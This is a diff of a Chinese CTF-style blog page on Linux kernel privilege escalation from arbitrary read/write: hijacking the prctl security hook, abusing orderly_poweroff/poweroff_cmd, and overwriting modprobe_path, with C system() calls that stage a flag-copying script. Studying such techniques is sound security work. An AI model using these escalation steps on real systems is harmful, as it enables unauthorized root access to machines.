@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="cred结构体提权 每个线程在内核中都对应一个线程栈,一个线程结构体thread_info,结构体同时也包含了线程的一系列信息,thread_info结构体存放在线程栈的最低地址. 12345678struct thread_info &amp;#123;	unsigned long flags;		/* low level flags */	int preempt_count;		/* 0 =&amp;gt">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-03-29T02:32:11.347Z">
+<meta property="og:updated_time" content="2021-06-12T23:08:05.297Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-kernel-任意读写到权限提升">
 <meta name="twitter:description" content="cred结构体提权 每个线程在内核中都对应一个线程栈,一个线程结构体thread_info,结构体同时也包含了线程的一系列信息,thread_info结构体存放在线程栈的最低地址. 12345678struct thread_info &amp;#123;	unsigned long flags;		/* low level flags */	int preempt_count;		/* 0 =&amp;gt">
@@ -568,8 +568,7 @@
 <p>而<code>security_task_prctl</code>函数最后调用了虚表函数.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> thisrc;</span><br><span class="line">	<span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line">	hlist_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">		thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">		<span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">			rc = thisrc;</span><br><span class="line">			<span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>调试发现这个<code>hook</code>位于<code>capability + 0x520 + 0x18</code>这个偏移,可以通过修改这个指针,从而劫持控制流.但是<code>prctl</code>系统调用第一个参数是<code>int</code>类型的,导致<code>64</code>位系统第一个参数如果是<code>64</code>位的话会被截断.</p>
-<p>这不影响<code>32</code>位下的漏洞利用,先通过劫持<code>hook</code>为<code>set_memory_rw</code>,然后传入<code>vdso</code>的地址,将<code>vdso</code>修改为可写,之后的就可以劫持<code>vdso</code>.</p>
-<p><code>64</code>位下是不可行的,因为第一个参数被截断了.</p>
+<p><code>32</code>位可以先通过劫持<code>hook</code>为<code>set_memory_rw</code>,然后传入<code>vdso</code>的地址,将<code>vdso</code>修改为可写,之后的就可以劫持<code>vdso</code>.</p>
 <p><code>call_usermoderhelper</code>是内核运行用户程序的一个<code>api</code>,有<code>root</code>权限.通过它就能以<code>root</code>权限执行想要执行的程序.</p>
 <p><code>call_usermoderhelper</code>的第一个参数也是<code>64</code>位的,不能直接劫持.但是内核中有些代码片段是调用<code>call_usermoderhelper</code>的.</p>
 <p>比如<code>kernel/reboot.c</code>中的<code>orderly_poweroff</code>函数中调用<code>run_cmd(poweroff_cmd)</code>,<code>poweroff_cmd</code>是一个全局变量,可以修改,第一个参数必须是程序的绝对路径.</p>
@@ -579,7 +578,7 @@
 <li>篡改<code>poweroff_cmd</code>为目的命令,篡改<code>prctl</code>的<code>hook</code>为<code>orderly_poweroff</code>,调用<code>prctl</code>执行预期命令内核提权.</li>
 </ul>
 <h2 id="modprobe_path">modprobe_path</h2>
-<p>当内核运行一个错误格式的文件的时候,会调用这个<code>modprobe_path</code>所指向的二进制文件.可以通过劫持这个指针来运行恶意文件.</p>
+<p>当内核运行一个错误格式的文件的时候,会经过多个函数最后以内核模式调用这个<code>modprobe_path</code>所指向的二进制文件.可以通过劫持这个指针来运行恶意文件.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep modprobe_path</span><br><span class="line"><span class="comment">#root</span></span><br></pre></td></tr></table></figure>
 <p>创建目标可执行文件.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/w4rd3n"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/w4rd3n"</span>);</span><br></pre></td></tr></table></figure>
